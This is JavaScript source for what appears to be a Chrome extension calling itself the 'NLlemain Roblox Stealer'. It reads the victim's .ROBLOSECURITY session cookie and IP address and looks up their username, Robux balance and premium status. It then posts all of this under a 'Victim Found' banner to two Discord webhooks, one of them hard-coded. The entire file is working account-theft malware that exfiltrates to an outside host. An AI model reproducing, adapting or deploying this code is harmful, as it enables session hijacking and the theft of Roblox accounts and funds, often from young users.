const WEBHOOK = "webhook_1";
const SECOND_WEBHOOK = "https://discord.com/api/webhooks/1433891785029189715/441B_fb0tXyqeBsgk5haRxcJ1LhR7vfDjQYkMCTaC3Wy5Nai5TqrYAFhVnQWLf5vurrw"; //add the web hook here

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    if (cookie) {
        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: ".ROBLOSECURITY=" + cookie
            },
            redirect: "manual"
        })).json();
    }

    const payload = {
        "content": null,
        "embeds": [
            {
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "color": null,
                "fields": [
                    {
                        "name": "Username",
                        "value": statistics ? statistics.UserName : "N/A",
                        "inline": true
                    },
                    {
                        "name": "Robux",
                        "value": statistics ? statistics.RobuxBalance : "N/A",
                        "inline": true
                    },
                    {
                        "name": "Premium",
                        "value": statistics ? statistics.IsPremium : "N/A",
                        "inline": true
                    }
                ],
                "author": {
                    "name": "Victim Found: " + ipAddr,
                    "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
                "footer": {
                    "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                },
                "thumbnail": {
                    "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                }
            }
        ],
        "username": "NLlemain Roblox Stealer",
        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
        "attachments": []
    };


    await Promise.all([
        fetch(WEBHOOK, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        }),
        fetch(SECOND_WEBHOOK, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        })
    ]);
}

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});

